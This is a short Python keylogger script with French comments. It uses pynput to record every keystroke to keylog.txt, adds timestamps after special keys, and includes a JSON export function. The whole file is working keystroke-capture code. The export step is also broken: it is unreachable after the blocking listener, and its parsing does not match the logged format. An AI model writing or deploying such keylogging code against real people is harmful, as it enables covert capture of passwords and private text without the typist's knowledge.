from pynput import keyboard #importation de la classe keyboard de la bibliotheque pynput
from datetime import datetime #importation date
import os
import json


def timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

output_file = "keylog.txt" #definition d un fichier de sortie


def on_press(key): #definition de la fonction on_press(key) qui affiche la touche appuyé
    try:
      with open(output_file, 'a') as f:
          f.write(key.char) #caractere normale
    except AttributeError:
        with open(output_file, 'a') as f:
            f.write(f'[ {str(key)} ]') #caractere speciale 
            with open(output_file, 'a') as f: #pour la date
                f.write(f"{timestamp()}")

with keyboard.Listener(on_press=on_press) as listener: #création d' un objet listener pour detecter les touches du clavier
    listener.join() #utilisation de listener.join() pour attendre indéfiniment que l utilisateur appuie sur les touches

def export_to_json():
    with open(output_file, 'r') as f:
        lines = f.readlines()

    data = [{"timestamp": line.split()[0], "key": line.split()[1]} for line in lines]

    with open("keylog.json", "w") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

